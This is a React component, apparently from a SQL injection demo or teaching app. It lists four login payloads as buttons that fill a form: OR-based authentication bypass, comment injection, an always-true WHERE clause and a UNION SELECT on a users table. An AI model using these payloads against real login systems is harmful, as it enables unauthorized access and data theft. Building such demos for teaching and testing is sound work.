import React from "react";

const payloads = [
  {
    name: "Authentication Bypass (OR)",
    username: "admin' OR '1'='1' --",
    password: "anything",
    description: "Uses OR condition to bypass authentication"
  },
  {
    name: "Comment Injection",
    username: "admin'--",
    password: "ignored",
    description: "Comments out password check"
  },
  {
    name: "Always True Condition",
    username: "' OR 1=1--",
    password: "anything",
    description: "Creates always-true WHERE clause"
  },
  {
    name: "Union Attack (Preview)",
    username: "admin' UNION SELECT * FROM users--",
    password: "",
    description: "Attempts to combine query results"
  }
];

export default function InjectionPayloads({ onFill }) {
  return (
    <div className="payloads">
      {payloads.map((p) => (
        <div key={p.name} className="payload">
          <button className="btn" onClick={() => onFill(p)}>{p.name}</button>
          <span className="payload-desc">{p.description}</span>
        </div>
      ))}
    </div>
  );
}

